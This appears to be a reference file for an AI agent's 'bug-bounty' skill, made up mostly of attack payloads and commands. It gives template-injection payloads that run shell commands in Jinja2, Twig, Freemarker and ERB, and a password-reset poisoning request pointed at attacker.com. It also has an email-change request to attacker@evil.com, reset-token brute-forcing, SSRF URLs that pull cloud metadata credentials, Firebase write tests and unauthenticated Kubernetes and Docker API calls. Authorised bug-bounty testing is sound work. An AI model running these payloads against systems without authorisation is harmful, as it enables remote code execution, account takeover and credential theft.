# SSTI, Takeover, ATO, Cloud

> Reference content for the `bug-bounty` skill. Originally SSTI, subdomain takeover, ATO, cloud/infra misconfigs of the monolithic SKILL.md (refactored 2026-11-18 for size/load efficiency).

## SSTI -- Server-Side Template Injection

### Detection Payloads
```
{{7*7}}          -> 49 = Jinja2 / Twig / generic
${7*7}           -> 49 = Freemarker / Pebble / Velocity
<%= 7*7 %>       -> 49 = ERB (Ruby)
#{7*7}           -> 49 = Mako / some Ruby
*{7*7}           -> 49 = Spring (Thymeleaf)
{{7*'7'}}        -> 7777777 = Jinja2 (Twig gives 49)
```

### Where to Test
- Name/bio/description fields (profile pages)
- Email templates (invoice name, username in confirmation email)
- Custom error messages
- PDF generators (invoice, report export)
- URL path parameters
- Search queries reflected in results

### Jinja2 -> RCE (Python / Flask)
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Twig -> RCE (PHP / Symfony)
```php
{{["id"]|filter("system")}}
```

### Freemarker -> RCE (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### ERB -> RCE (Ruby on Rails)
```ruby
<%= `id` %>
```

## Subdomain Takeover

### Detection
```bash
# Check for dangling CNAMEs
cat /tmp/subs.txt | dnsx -silent -cname -resp | grep -i "CNAME" | tee /tmp/cnames.txt
# Look for CNAMEs to: github.io, heroku.com, azurewebsites.net, netlify.app, s3.amazonaws.com

# Automated takeover detection
nuclei -l /tmp/subs.txt -t ~/nuclei-templates/takeovers/ -o /tmp/takeovers.txt
```

### Quick-Kill Fingerprints
```
"There isn't a GitHub Pages site here"  -> GitHub Pages
"NoSuchBucket"                          -> AWS S3
"No such app"                           -> Heroku
"404 Web Site not found"                -> Azure App Service
"Fastly error: unknown domain"          -> Fastly CDN
"project not found"                     -> GitLab Pages
"It looks like you may have typed..."   -> Shopify
```

### Impact Escalation
- Basic takeover: serve page under target.com subdomain -> Low/Medium
- + Cookies: if target.com sets cookie with domain=.target.com -> credential theft -> High
- + OAuth redirect: if sub.target.com is a registered redirect_uri -> ATO chain -> Critical
- + CSP bypass: if sub.target.com is in target's CSP -> XSS anywhere -> Critical

## ATO -- Account Takeover (Complete Taxonomy)

### Path 1: Password Reset Poisoning (Host Header Injection)
```bash
POST /forgot-password
Host: attacker.com
Content-Type: application/x-www-form-urlencoded
email=victim@company.com
# If reset link = https://attacker.com/reset?token=XXXX -> ATO
# Also try: X-Forwarded-Host, X-Host, X-Forwarded-Server
```

### Path 2: Reset Token in Referrer Leak
After clicking reset link, if page loads external resources -> token in Referer header to external domain.

### Path 3: Predictable / Weak Reset Tokens
```bash
# If token < 16 hex chars or numeric only -> brute-forceable
ffuf -u "https://target.com/reset?token=FUZZ" -w <(seq -w 000000 999999) -fc 404 -t 50
```

### Path 4: Token Not Expiring / Reuse
Request token -> wait 2 hours -> use it -> still works? Request token #1 -> request token #2 -> use token #1 -> still works?

### Path 5: Email Change Without Re-Authentication
```bash
PUT /api/user/email
{"new_email": "attacker@evil.com"}
# If no current_password required -> attacker changes email -> locks out victim
```

### Path 6: OAuth Account Linking Abuse
Can you link an OAuth account from a different email to an existing account?

### Path 7: Session Fixation
GET /login -> note Set-Cookie session=XYZ -> Log in -> does session ID change? If not = fixation.

## Cloud / Infra Misconfigs

### S3 / GCS / Azure Blob
```bash
# S3 public listing
aws s3 ls s3://target-bucket-name --no-sign-request

# Try common names
for name in target target-backup target-assets target-prod target-staging target-uploads target-data; do
  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done
```

### EC2 Metadata (via SSRF)
```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns role name, then:
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
# Returns AccessKeyId, SecretAccessKey, Token -> Critical

# GCP (needs header Metadata-Flavor: Google):
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure (needs header Metadata: true):
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### Firebase Open Rules
```bash
curl -s "https://TARGET-APP.firebaseio.com/.json"
# If data returned -> open read
curl -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'
# If success -> open write -> Critical
```

### Exposed Admin Panels
```bash
/jenkins       /grafana       /kibana        /elasticsearch
/swagger-ui.html  /api-docs   /phpMyAdmin    /adminer.php
/.env          /config.json   /server-status /actuator/env
```

### Kubernetes / Docker
```bash
# K8s API (unauthenticated):
curl -sk https://TARGET:6443/api/v1/namespaces/default/pods
# Docker API:
curl -s http://TARGET:2375/containers/json
```

---
